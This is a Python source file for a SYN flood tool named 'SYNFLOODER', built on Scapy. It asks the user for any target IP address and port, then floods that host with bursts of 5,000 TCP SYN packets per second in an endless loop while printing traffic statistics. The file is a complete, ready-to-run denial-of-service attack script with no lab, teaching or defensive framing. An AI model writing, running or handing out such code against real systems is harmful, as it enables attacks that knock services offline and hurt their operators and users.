import time
import threading
from scapy.all import IP, TCP, send

# Constants for SYN packet size
SYN_PACKET_SIZE = 40  # Approximate size of a SYN packet (IP + TCP)

# Number of packets to send per burst
PACKETS_PER_BURST = 5000  # Send 5000 packets per second

# ANSI escape code for purple
PURPLE = "\033[35m"
RESET = "\033[0m"

# ASCII Art to display at the start
ASCII_ART = """
███████╗██╗   ██╗███╗   ██╗███████╗██╗      ██████╗  ██████╗ ██████╗ ███████╗██████╗
██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗
███████╗ ╚████╔╝ ██╔██╗ ██║█████╗  ██║     ██║   ██║██║   ██║██║  ██║█████╗  ██████╔╝
╚════██║  ╚██╔╝  ██║╚██╗██║██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██╗
███████║   ██║   ██║ ╚████║██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗██║  ██║
╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

# Function to send a single SYN packet
def send_syn_packet(target_ip, target_port):
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags="S", seq=1000)
    send(ip/syn, verbose=0)

# Function to send a burst of packets
def send_packet_burst(target_ip, target_port, num_packets):
    for _ in range(num_packets):
        send_syn_packet(target_ip, target_port)

# Function to run the flood continuously and quickly
def main():
    # Print ASCII art in purple
    print(f"{PURPLE}{ASCII_ART}{RESET}")
    
    target_ip = input(f"{PURPLE}Enter the target IP address: {RESET}")
    target_port = int(input(f"{PURPLE}Enter the target port: {RESET}"))
    
    total_packets_sent = 0
    total_bytes_sent = 0
    start_time = time.time()
    
    print(f"\n{PURPLE}Starting SYN flood... Press Ctrl+C to stop and see results.{RESET}\n")
    
    try:
        while True:
            # Start a new thread to send a burst of packets
            send_thread = threading.Thread(target=send_packet_burst, args=(target_ip, target_port, PACKETS_PER_BURST))
            send_thread.start()
            send_thread.join()  # Ensure the thread finishes before starting a new one

            total_packets_sent += PACKETS_PER_BURST
            total_bytes_sent += PACKETS_PER_BURST * SYN_PACKET_SIZE
            
            # Calculate elapsed time and statistics
            elapsed_time = time.time() - start_time
            packets_per_second = total_packets_sent / elapsed_time
            avg_packet_size = total_bytes_sent / total_packets_sent if total_packets_sent > 0 else 0

            # Display the stats every second (or near real-time)
            print(f"{PURPLE}ms: {elapsed_time * 1000:.2f} | "
                  f"Packets Sent: {total_packets_sent} | "
                  f"Bytes Sent: {total_bytes_sent} | "
                  f"Avg Packets Per Sec: {packets_per_second:.2f} | "
                  f"Avg Packet Size: {avg_packet_size:.2f} bytes{RESET}", end="\r")
            
            time.sleep(1)  # Send bursts of 5000 packets every 1 second

    except KeyboardInterrupt:
        # When Ctrl+C is pressed, print the final stats
        elapsed_time = time.time() - start_time
        packets_per_second = total_packets_sent / elapsed_time
        avg_packet_size = total_bytes_sent / total_packets_sent if total_packets_sent > 0 else 0
        
        print("\n\nSYN Flooding Stopped.")
        print(f"Elapsed Time: {elapsed_time:.2f} seconds")
        print(f"Total Packets Sent: {total_packets_sent}")
        print(f"Total Bytes Sent: {total_bytes_sent}")
        print(f"Avg Packets Per Second: {packets_per_second:.2f}")
        print(f"Avg Packet Size: {avg_packet_size:.2f} bytes")
        print("Exiting...")

if __name__ == "__main__":
    main()
